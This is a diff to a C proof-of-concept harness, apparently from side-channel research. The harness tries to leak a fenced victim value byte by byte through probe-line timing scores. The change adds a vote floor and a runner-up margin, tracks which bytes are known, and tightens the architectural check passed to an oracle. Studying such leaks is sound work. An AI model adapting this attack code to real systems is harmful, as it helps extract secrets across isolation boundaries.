@@ -36,6 +36,7 @@
 #define CAP          300
 #define REPS         7
 #define MARGIN       20              /* cycles a winning line must beat 2nd by */
+#define MIN_VOTES    3               /* of REPS=7; below this, report unknown */
 #define FLUSH_SZ     (128 * 1024)
 
 #define SENTINEL     0xAAAAAAAAAAAAAAAAULL
@@ -72,7 +73,8 @@ atk_load(volatile uint64_t *base, uint64_t idx)
  * (egdiff_secret.c), so this file has no architectural reference to the value
  * it is supposed to obtain. */
 extern uint64_t victim_value_fenced(uint64_t token);
-extern int oracle_report_v2(uint64_t recovered, int arch_ok, uint64_t sink);
+extern int oracle_report_v2(uint64_t recovered, uint64_t known_mask,
+                            int arch_ok, uint64_t sink);
 
 static uint64_t
 mix(uint64_t x)
@@ -95,6 +97,8 @@ main(void)
 
     uint64_t sink = 0;
     uint64_t recovered = 0;
+    uint64_t known = 0;
+    int arch_ok = 1;
 
     for (int b = 0; b < 8; b++) {
         int score[LINES];
@@ -133,6 +137,8 @@ main(void)
 
             uint64_t reg = atk_load(atk_buf, x);
             sink += reg;
+            if (reg != SENTINEL)
+                arch_ok = 0;
 
             /* Predicted value is -S; the architectural value is SENTINEL.
              * Route the latter to the reserved probe slot. */
@@ -166,18 +172,26 @@ main(void)
             }
         }
 
-        int leak = 0;
-        for (int k = 1; k < LINES; k++)
-            if (score[k] > score[leak])
+        int leak = -1, max = 0, runner_up = 0;
+        for (int k = 0; k < LINES; k++) {
+            if (score[k] > max) {
+                runner_up = max;
+                max = score[k];
                 leak = k;
-        if (votes == 0 || score[leak] == 0)
-            leak = -1;                      /* no confident measurement */
-        if (leak >= 0)
+            } else if (score[k] > runner_up) {
+                runner_up = score[k];
+            }
+        }
+        /* Require a vote floor and a 2x margin over the runner-up.  Without
+         * both, a single lucky attempt can decide a byte (the old control
+         * fabricated seven bytes this way). */
+        if (max < MIN_VOTES || max < 2 * runner_up)
+            leak = -1;
+        if (leak >= 0) {
             recovered |= ((uint64_t)(uint8_t)leak) << (8 * b);
+            known |= 1ULL << b;
+        }
     }
 
-    /* ---- Architectural checksum: the harness must have done what it claims ---- */
-    uint64_t arch_ok = (atk_buf[0] == SENTINEL);
-
-    return oracle_report_v2(recovered, arch_ok, sink);
+    return oracle_report_v2(recovered, known, arch_ok, sink);
 }
